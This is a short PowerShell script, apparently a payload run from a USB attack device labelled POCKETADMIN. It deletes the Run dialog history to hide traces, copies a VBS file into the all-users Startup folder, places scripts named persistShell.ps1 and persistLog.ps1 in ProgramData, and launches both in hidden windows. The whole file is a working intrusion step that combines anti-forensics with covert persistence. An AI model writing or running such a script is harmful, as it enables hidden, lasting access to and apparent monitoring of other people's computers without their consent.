#clear run line history, get driveletter of the POCKETADMIN volume
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU\' -Name '*' -ErrorAction SilentlyContinue
$driveletter = (Get-Volume -FileSystemLabel POCKETADMIN).DriveLetter

#create new directory and copy persistent powershell scripts to it
New-Item -ItemType Directory -Force -Path "C:\ProgramData\Persist"
Copy-Item "${driveletter}:\persist\persist.vbs" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
Copy-Item "${driveletter}:\persist\persistShell.ps1" "C:\ProgramData\Persist"
Copy-Item "${driveletter}:\persist\persistLog.ps1"   "C:\ProgramData\Persist"

#run persistent powershell scripts
start-process powershell C:\ProgramData\Persist\persistShell.ps1 -windowstyle hidden
start-process powershell C:\ProgramData\Persist\persistLog.ps1   -windowstyle hidden
